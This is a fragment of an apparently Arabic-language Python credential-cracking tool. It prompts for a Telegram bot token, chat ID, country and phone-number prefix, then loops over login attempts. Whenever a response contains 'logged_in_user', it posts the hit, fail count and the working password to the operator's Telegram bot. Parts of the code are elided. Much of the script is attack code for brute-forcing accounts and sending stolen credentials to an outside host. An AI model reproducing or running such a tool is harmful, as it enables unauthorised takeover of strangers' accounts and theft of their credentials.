...
print(timee)
print('  ')
hunter = pyfiglet.figlet_format(" M . S . A ")
print(' ')
def j(z):
    for e in z:
        sys.stdout.write(e)
...
sleep(1)
print('  ') 
tok = input (''+B+'('+A+'!'+X+')'+B+'  ⌯ اكتب التوكن :  '+F)
print('  ')
ID = input (''+B+'('+A+'!'+X+')'+B+'  ⌯ اكتب الآيدي:  '+F)
print(' ') 
shuger = input (''+B+'('+A+'!'+X+')'+B+'  ⌯ اختار أي رقم من الدول الي تريد تصيد عليها  :  '+F)
print('  ')
er = input (''+B+'('+A+'!'+X+')'+B+'  ⌯ اكتب بداية الرقم بدون صفر. :  '+F) 
print('  ') 
oe = input (''+B+'('+A+'!'+X+')'+B+'  ⌯ ارجع اكتب نفس الرقم بدون صفر  :  '+F)
print('  ')
j('-'*30)
print('  ')
import time
...
if '[VPN]' in rss:
    ...
    while True:
        ...
        if 'logged_in_user' in req.json():
            ...
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=روح نام من اصيد حساب اگلك 🌚 ♻️\n= = = = = = = = = = = = = = =\n\n𝐡𝐢𝐭 : {zz}\n\n𝐛𝐚𝐝 : {aa}\n\n𝐜𝐡𝐞𝐜𝐤 : {password}\n\n𝐭𝐢𝐦𝐞 : {current_time}\n= = = = = = = = = = = = = = =\n\n𝐛𝐲 : @SQ21C ")
